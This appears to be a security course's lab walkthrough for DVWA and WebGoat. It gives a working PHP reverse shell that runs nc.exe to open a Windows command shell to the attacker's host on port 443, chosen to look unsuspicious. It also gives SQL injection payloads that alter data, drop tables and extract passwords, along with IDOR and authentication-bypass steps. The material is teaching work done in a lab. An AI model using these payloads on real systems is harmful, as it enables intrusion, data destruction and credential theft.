Now we will use the File Upload feature (in low security) to upload a reverse shell to the DVWA target. When the reverse shell runs, it will connect back to the hacker's computer and the hacker can get a shell on the target.

---
**Win10 VM**
- Ensure that Real-Time Protection feature of Windows Defender is off, in order for uploaded scripts to run on the Win10 target.

**Kali VM**

- List out the content of `/usr/share/webshells/php` directory
- View the script php-reverse-shell.php. To use this script, the hacker will change the `$ip` and `$port` variables to his IP address and the port where he has a process like Netcat listening.
	- If he manages to get this script to run on the target, the script will connect back to his computer on the specified port, and run the commands in `$shell`, and giving th hacker `/bin/sh` interactive shell.
	- However, this script only works on **Linux targets**. Our DVWA is running on Windows, so we need a reverse shell that will work on Windows targets.
	- You can find such script online, though, the Windows User Account Control (UAC) security feature may prevent such scripts from running on the target.
	- To get around Windows User Account Control, the hacker may upload a network connection software like Netcat for Windows, and then upload a script to run the Netcat software.
- Download Netcat for Windows and extract the zip file. 
	- If asked for password, enter "nc".
	- The executable file we want is called "nc.exe"
- Create the following script. You can name the file `nc-reverse-shell.php`
```php
<?php

  header('Content-type: text/plain');

  $ip = "192.168.2.128"; //change this to your Kali IP

  $port = "443"; //or change this to any port number not in use on Kali

  $cmd = "nc.exe -e cmd.exe ".$ip." ".$port;

  echo "\nExecuting : ".$cmd."\n";

  $output = system($cmd);

?>
```

- In a terminal, run Netcat to start listening on Port 443.
```linux
sudo nc -l -p 443
```

- Browse to DVWA and ensure security level is low
- Click on File Upload and upload both `nc.exe` and `nc-reverse-shell.php`
- Now, browse to the path of the uploaded `nc-reverse-shell.php` file.
```linux
http://192.168.2.130/dvwa-master/hackable/uploads/nc-reverse-shell.php
```
- If you switch to the terminal where Netcat is running, you will be at the Command Prompt of the Win10 and you can run commands on the target.

**Win10 VM**
- Use Netstat to see the established connections
	- You will see there is an established connection to your Kali on port 443. 
	- As port 443 is normally used for web servers, and if the victim is browsing other websites, he will see many other connections to other IP addresses on port 443.
	- Hence he may not think that this particular connection is suspicious.

## WebGoat
WebGoat is another vulnerable web application that can be used for testing. It consists of many lessons on various aspects of web application security.

---
**Kali VM**
- Download webgoat-server file from Brightspace or the download link.
- WebGoat will run on port 8080 by default. 
	- The following command starts WebGoat on Port 9090
```linux
java -jar webgoat-server-nnnn.jar --server.port=9090
```

- Browse to `http://127.0.0.1:9090/WebGoat`
	- Register a new user account (username and password are "webgoat")

### Client side - Bypass Front End Restrictions
The web application implements some client-side checks on the user input. For example, a textbox for entering the Username only allows a maximum of 20 characters. However, users are able to bypass such restrictions.

**Concept**
Users have a great degree of control over the front-end of the web application. They can alter HTML code, sometimes also scripts. This is why apps that require certain format of input should also validate on server-side.

**Goals**
- The user should have a basic knowledge of HTML
- The user should be able to tamper a request before sending (with proxy or other tool)
- The user will be able to tamper with field restrictions and bypass client-side validation

---
**Kali VM**
- In WebGoat, expand "Client side" and select "Bypass front-end restrictions"

- Click on Button 2 or the Arrow to proceed to Page 2.
- In this page, there is a form which only allows the user to select certain values or enter values with restrictions.
	- We will use Burpsuite as an intercepting proxy to intercept the HTTP request and "tamper" with the user input to change them to other values.
- Run `sudo burpsuite` in a terminal.
- Now configure the Firefox Browser to use Burpsuite as the proxy. 
	- **Note** : you can also choose to use Burp's built-in Chromium web browser
	- In the Firefox browser, click on the Open Menu icon. Click on Preference
	![[Pasted image 20220710201937.png]]
	- Scroll down the General Preferences. Under Network Settings, for "Configure how Firefox connects to the Internet", click Settings.
	![[Pasted image 20220710201815.png]]
	- Select "Manual proxy configuration"
		- For HTTP Proxy, enter "127.0.0.1". For Port, enter "8080". Check the box "Use this proxy server for all protocols"
		- Click OK and close Preferences. 
	- Now all the HTTP requests and responses will be passing through BurpSuite.
	  ![[Pasted image 20220710202314.png]]
- In Burpsuite, select the Proxy tab.
	- Under the Intercept tab, check that "Intercept is on".
- In Firefox Browser, select some choices on the form and click Submit
	- The HTTP request packet will be intercepted by Burpsuite.
- In Burpsuite, many HTTP request packets like the following are trapped and will appear. These packets are not the HTTP request packet containing the form we submitted.
	- Click Forward to forward them.
	![[Pasted image 20220713013330.png]]
- Keep clicking Forward until you see the HTTP request packet containing the submitted form.
	![[Pasted image 20220713013358.png]]
- Then change the values for the various input fields.
	- For example, you can change the following information
	![[Pasted image 20220713013950.png]]
- In Burpsuite, click the Intercept button to set "Intercept is off".
	- The modified HTTP request is sent to WebGoat.
- In the Firefox browser, you will see a Congratulations message.
![[Pasted image 20220713013648.png]]
- Click on Button 3 to progress to Page 3.
- The form on page 3 has frontend (or client side) validation checks to ensure the data entered is valid.
	- E.g. The user is supposed to enter only three lowercase characters for Field 1. Try entering some numberes for Field 1 and click Submit. The client side validation check will display an error
![[Pasted image 20220713014004.png]]
- Submit the form in the Firefox Browser
- In Burpsuite, Click Forward until you see the HTTP request packet for the form you just submitted.
 ![[Pasted image 20220713014122.png]]
- Modify the form data so that the fields do not meet the validation checks. E.g., you can change to the following values
![[Pasted image 20220713014204.png]]

- In Burp, click the Intercept button to set "Intercept is off". 
	- The modified HTTP request is sent to WebGoat.
- You will then see the Congratulations message in the Firefox browser.

### Authentication Flaws - Authentication Bypass
Authentication Bypasses happen in many ways, but usually take advantage of some flaw in the configuration or logic. Tampering to achieve the right conditions.

Bypassing Methods:
- **Hidden Inputs** : Relies on a hidden input that is in the webpage/DOM.
- **Removing Parameters** : If an attacker doesn't know the correct value of a parameter, they may remove the parameter from the submission altogether to see what happens.
- **Forced Browsing** : If an area of a site is not protected properly by configuration, that area of the site may be accessed by guessing/brute-forcing.

---
**Kali VM**
- In WebGoat, expand "Broken Authentication" and select "Authentication Bypasses"
- Click on Button 2 or the Arrow to proceed to Page 2.
- Under the Scenario
	- You have forgotten the answers to your Security Questions so you are asked to intercept the HTTP request and remove them.
- Ensure Burpsuite is running, should be on Port 8080 by default
- In Burpsuite, select the Proxy tab.
	- Under the Intercept tab, check that "Intercept is on".
- In Firefox Browser, configure the proxy to use Burp on 127.0.0.1 Port 8080. 
	- Now all the HTTP requests and responses will be passing through Burp.
- Type in some answer to the Security Questions and click Submit.
	- Answers doesn't have to be legitmate

![[Pasted image 20220726171856.png]]
- Forward HTTP request packets until you find the HTTP request packet to POST your answers to the security questions.
![[Pasted image 20220726172025.png]]
- Then in Burp, change the body of the HTTP request so that the secQuestion0 and secQuestion1 will **always be true**.
![[Pasted image 20220726172119.png]]
- In Firefox, check if the answer is correct
![[Pasted image 20220726172448.png]]

### Access Control Flaws - Insecure Direct Object Reference
**Direct Object References** are when an application uses client-provided input to access data & object.

 **POST, PUT, DELETE or other methods** are potentially susceptible and mainly only differ in the method and the potential payload.

When references are not properly handled, it allows for authorization bypasses or disclosure of private data that could be used to perform opertaions or access data that the user should not be able to perform or access.

Let's say that as a user, you go to view your profile and the URL looks something like:
https://some.company.tld/app/user/23398
... and you can view your profile there. 

So what happens if you navigate to:
https://some.company.tld/app/user/23399 ... or use another number at the end. 
If you can manipulate the number (user id) and view another's profile, then the object reference is insecure. This of course can be checked or expanded beyond GET methods to view data, but to also manipulate data.

---
**Kali VM**
- In WebGoat, expand "Access Control Flaws" and select "Insecure Direct Object Reference"
- Click on the Button 2 to proceed
- Follow the instruction on the page, login with username `tom` and password `cat` and click Submit.
- Click on the Button 3 to proceed
- Click on View Profile. 
	- You will see that you are currently logged in as "Tom Cat" and your profile also contains the color "yellow" and size "small".
	- However, the page states that the HTTP response packet sent by the WebGoat application also contains other attributes for Tom Cat's profile that is not displayed on the page.
	- We will use **Burp** as an intercepting proxy to view the HTTP response to see these other attributes.
- Ensure Burpsuite is running, should be on Port 8080 by default
- In Firefox Browser, configure the proxy to use Burp on 127.0.0.1 Port 8080. 
	- Now all the HTTP requests and responses will be passing through Burp.
- In Burpsuite, select the Proxy tab.
	- Under the Intercept tab, check that "Intercept is on".
- In Firefox Browser, click on View Profile to send the HTTP request to WebGoat again.
- In Burp, keep forwarding HTTP request packets until you see the HTTP request packet for the View Profile.
![[Pasted image 20220726231237.png]]
- Click on Action and select Send to Repeater
![[Pasted image 20220726231256.png]]
- Select the Repeater tab. The HTTP request apperas under the Request column.
	- Click the Send button to send the HTTP request to WebGoat.
	![[Pasted image 20220726231335.png]]
- The HTTP response appears in the Response column
	- Notice "Tom Cat" has the userId 2342384
	![[Pasted image 20220726231409.png]]
- You can see that there are **two attributes "role" and "userId"** in the HTTP response packet but not displayed on the webpage.
- In Burp, select Proxy tab. Set "Intercept is off".
- In Firefox Browser, enter "role, userId" for the two attributes and click Submit Diffs.
	- If the submitted answer is correct, click on the Button 4 to proceed.
- You are now asked to guess another URL to view Tom Cat's profile.
	- Remember the GET request is `GET /WebGoat/IDOR/profile`
	- Tom Cat has the userId "2342384"
	- How about trying `GET /WebGoat/IDOR/profile/2342384`?
- If the submitted answer is correct, click on the Button 5 to proceed.
- You are now asked to click the View Profile button, intercept the HTTP request and modify it so that you can view the profile of another user.
- In Burp, set “Intercept is on”.
- In Firefox Browser, in Button 5 page, under View Another Profile, click the View Profile button.
- In Burp, keep forwarding HTTP request packets until you see the HTTP request packet for the View Profile.
	![[Pasted image 20220726233208.png]]
- In Burp, replace the %7Buserid%7D with a possible userid value. Tom Cat has the userid 2342384, so let's try the next userid 2342385. 
![[Pasted image 20220726234237.png]]
- In Burp, set "Intercept is off"
- In Firefox Browser, check if the answer is corect. 
	- If no message appears, the answer is wrong.
	- So there is no such user with userid 2342385, and have to try another userid
- In Burp, set "Intercept is on"
- In Firefox Browser, in Button 5 page, under View Another Profile, click the View Profile button.
- In Burp, click Forward until you see the HTTP request for the View Profile.
- This time, replace the %7Buserid%7D withanother possible userid value, e.g. 2342386
- In Burp, set "Intercept is off"
- In Firefox Browser, check if the answer is correct.

- Continue until you find a valid userid
	- You will find the following message when you try 2342388
	![[Pasted image 20220726235040.png]]
	- A faster method would be to user "Send to Repeater" feature in Burp.
- Still in Button 5, we will now try to Edit Another Profile
- You are asked to edit Buffalo Bill's profile, and change his role to a smaller number and set his color to red.
- From the ealier Button 3 lesson, when you viewed the Profile for Tom Cat and intercepted the HTTP response, you saw that the data was in JSON format.
```json
{

  "role": 3,

  "color": "yellow",

  "size": "small",

Note that “userId” has a capital “I”

  "name": "Tom Cat",

  "userId": "2342384"

}
```
- In Burp, set "Intercept is on"
- In Firefox Browser, in Button 5 page, under Edit Another Profile, click the View Profile button.
- In Burp, click Forward until you see the HTTP request for the View Profile
	![[Pasted image 20220726235852.png]]
- Make the following changes to the HTTP request
	- Change the GET method to PUT
	- Change Content-Type to "application/json"
	- Change %7Buserid%7D to Buffalo Bill's userid 2342388
	![[Pasted image 20220726235953.png]]
- Set "Intercept is off"
- In Firefox Browser, check if the answer is correct.
	![[Pasted image 20220727000205.png]]
	- If the answer is wrong, check for typing errors, or you may need to refresh the webpage.


### Injection Flaws - SQL Injection (intro)

**Concept**
This lesson describes what is Structured Query Language (SQL) and how it can be manipulated to perform tasks that were not the original intent of the developer

**Goals**
- Ther user will have a basic understanding of how SQL works and what it is used for
- The user will have a basic understanding of what SQL injections are and how they work
- The user will demonstrate knowledge on:
	- DML, DDL and DCL
	- String SQL injection
	- Numeric SQL injection
	- Violation of the CIA triad
---

**Kali VM**

- In WebGoat, expand "SQL Injection Flaw" and select "SQL Injection (Introduction)"
- Go to Page 2 and read the instructions
![[Pasted image 20220727002849.png]]
- Enter the following query to retrieve the department of Bob Franco.
	- You should see the message "Succeeded"
```SQL
SELECT department FROM employees WHERE userid = "96134"
```

#### Data Manipulation Language (DML)

DML commands are used for storing, retrieving, modifying, and deleting data.
- SELECT - retrieve data from a database
- INSERT - insert data into a table
- UPDATE - updates existing data within a table
- DELETE - Delete all records from a database table

---
- Go to Page 3 and read the instructions
![[Pasted image 20220727002856.png]]
- Enter the following update statement to update the department of Tobi Barnett.
	- You should see the message "Succeeded"
```SQL
UPDATE employees SET department = "Sales" WHERE userid = "89762"
```

#### Data Definition Language (DDL)

Data definition language includes commands for defining data structures, especially database schemas which tell how the data should reside in the database.

DDL commands are used for creating, modifying, and dropping the structure of database objects.
- CREATE - to create a database and its objects like (table, views, …)
- ALTER - alters the structure of the existing database
- DROP - delete objects from the database

---
- Go to Page 4 and read the instructions.
![[Pasted image 20220727003121.png]]
- Enter the following alter statement to add a new column to the table "employees".
	- You should see the message "Succeeded"
```SQL
ALTER TABLE employees add phone VARCHAR(20)
```

#### Data Control Language 
Data control language is used to create privileges to allow users to access and manipulate the database.

DCL commands are used for providing security to database objects.
- GRANT - allow users access privileges to the database
- REVOKE - withdraw users access privileges given by using the GRANT command

---
- Go to Page 5 and read the instruction.
![[Pasted image 20220727003303.png]]
- Enter the following grant statement to grant the usergroup "UnauthorizedUser" the right to alter tables.
	- You should see the message "Suceeded"
```SQL
GRANT ALTER TABLE to UnauthorizedUser
```


**Trying SQL Injection**

- Go to Page 6, 7, 8 to read about SQL Injection on their respective pages
- Go to Page 9 and read the instructions
![[Pasted image 20220727010753.png]]
- For the first dropbox, select `'`. 
- For the second drop box, select `or`
- For the third dropbox, select `'1' = '1`
- You should see the message "Succeeded". Read the Explanation of how the SQL Injection worked.
- Go to Page 10 and read the instructions.
![[Pasted image 20220727012504.png]]
- Try to SQL Inject the Login Count, by entering the following values.

	- Login_Count: `0 or 1 = 1`
	- User_Id: `0`
	- You will get an Incorrect message.

- Try to SQL Inject the User Id by entering the following values.
	- Login_Count: `0`
	- User_Id: `0 or 1 = 1`
	- You should see the message "Succeeded"

- Go to Page 11 and read the instructions
![[Pasted image 20220730011810.png]]
- Try to SQL Inject the Employee Name by entering the following values.
	- Employee Name: `a' or '1' = '1`
	- Authentication TAN : `3SL99A`
	- You get a message that you only retrieved one record.

- Try to SQL Inject both the Employee Name and Authentication TAN.
	- Employee Name: `a' or '1' = '1`
	- Authentication TAN : `3SL99A' or '1' = '1`
	- You should see the message "Succeeded."

- Go to Page 12. Read the instructions.
![[Pasted image 20220727140946.png]]
- Find the salary for John Smith.
	- Employee Name: `Smith`
	- Authentication TAN : `3SL99A`
	- John Smith’s record is returned.

![[Pasted image 20220730012331.png]]

- SQL Inject the Authentication TAN and chain another `UPDATE` statement to update John Smith’s salary to a high figure.
	- Employee Name: `Smith`
	- Authentication TAN : `3SL99A'; UPDATE employees SET salary=100000 where userid='37648`
	- You should see the message “Well done”.

- Go to Page 13. Read the instructions.
![[Pasted image 20220730012405.png]]
-  Enter “update” as the Action and click **Search log**
- The `UPDATE` statement that you ran to update John Smith’s salary is displayed.
![[Pasted image 20220730012446.png]]
- Use SQL Injection to `DELETE` all records from the `access_log` table.
	- Action contains : `UPDATE '; DELETE FROM access_log --`

- You get the advice to remove the whole table.
![[Pasted image 20220730012625.png]]

- Try to drop the `access_log` table.
	- Action contains : `UPDATE '; DROP TABLE access_log --`
	- You should see the message “Success”.

### Injection Flaws - SQL Injection (advanced)

#### SQL Injection with UNION
- In WebGoat, expand “SQL Injection Flaw”. Select SQL Injection (advanced).
- Read the instructions on Page 1 and 2.
-  Go to page 3.
![[Pasted image 20220730013032.png]]
-  Try to SQL Inject the Name field by entering the following.
	- Name : `a' or 1=1 --`

- All the records from the `user_data` table are displayed. 
	- Note that 7 columns are displayed so the original SQL query has 7 columns. 
	- First 6 columns [ `userid`, `first_name`, `last_name`, `cc_number`, `cc_type` and `cookie` ] are likely to be strings
	- Last column [ `login_count` ] is likely to be a number.

 ![[Pasted image 20220730013037.png]]

- SQL Inject the Name field and append a `UNION SELECT` query to retrieve the records from the `user_system_data` table. 
	- As there are only 4 columns in the `user_system_data` table and the second `SELECT` query needs 7 columns
	- ‘1’, ‘2’ and 3 are placeholders to make up the 7 columns. 
	- The datatype of the columns must match too, so the last column in the second `SELECT` query is a number.
	- Name : `a' or 1=1 union select userid, user_name, password, cookie,'1','2',3 from user_system_data --`
- All the records from both the `user_data` and `user_system_data` tables are displayed.
- Look for Dave’s password and enter it as the answer.
![[Pasted image 20220730013712.png]]
- You should see the message “Congratulations”.

#### Blind SQL Injection

- Go to Page 4 to read about Blind SQL Injection.
- Go to Page 5.
![[Pasted image 20220730024547.png]]

-  In the form, click on Register tab and register a new user with username “student”.
- Try to register another user with username “student”. 
	- You will get a message that “User student already exists”.

- It is likely when you register a new user, there is a `SELECT` query to check if the username already exists in the table.

- Try to SQL Inject the username.
	- Username : `student' and '1'='1`
	- You can enter any values for the other fields.
- Both `student and '1'='1'` are true, so the `SELECT` query is successful and you get a message that the username already exists.

- Try to SQL Inject the username again. 
	- This time, make the SQL query unsuccessful by having ‘1’=’2’.
	- Username : `student' and '1'='2`

- The `student` is true but`'1'='2'` is not true, so the `SELECT` query is not successful. 
	- You get a message that the user is created.

- We know there is a user “tom”. 
- Use SQL Inject and the substring function on the password for `tom` to find if the first character of the password is ‘a’. 
	- (We are assuming the name of the column containing the password is "password")
	- Username : `tom' and substring(password,1,1)='a`

- `tom` part is true but because there is a message that the user is created, this means substring(password,1,1)='a' is not true. 
- So the password does not start with ‘a’.

- Continue trying with all the other letters in the alphabet (upper and lower case) and numbers too, to find the first character of the password. Hackers would probably want to automate this! 
	- Hint : the first character of the password is ‘t’, is 23 characters long, and is made up of lower-case letters only.

- To find the second character of the password
	- Username : `tom' and substring(password,2,1)='a`